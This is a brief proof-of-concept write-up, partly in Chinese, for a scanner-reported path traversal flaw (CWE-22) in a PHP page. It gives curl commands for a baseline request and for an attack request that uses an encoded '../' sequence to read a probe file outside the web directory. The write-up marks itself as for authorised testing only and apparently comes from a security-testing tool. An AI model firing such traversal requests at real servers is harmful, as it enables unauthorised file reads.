# POC — AWVS: Path Traversal

- finding_id: `URL-3cb5b820c7f2`
- type: `path_traversal` / CWE-22
- severity: `high`
- file: `:0`

## 步骤

1. **Baseline request**  
```http
curl -sS -i -X GET 'http://TARGET:8080/029.php?page=FileName' \
  -H 'User-Agent: Sunset-AWVS-Probe/1.0' \
  -H 'Accept: */*'
```
预期：HTTP 200 and the normal application response.

2. **Replay the AWVS attack request (路径穿越 / 任意文件读写)**  
```http
curl -sS -i -X GET 'http://TARGET:8080/029.php?page=..%2F..%2F..%2F..%2Ftmp%2Fsunset_probe.txt' \
  -H 'User-Agent: Sunset-AWVS-Probe/1.0' \
  -H 'Accept: */*'
```
预期：The response reflects/contains a traversal path or the content of a file outside testfiles/.

3. **Compare baseline and attack responses**  
预期：A security-relevant differential appears.

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。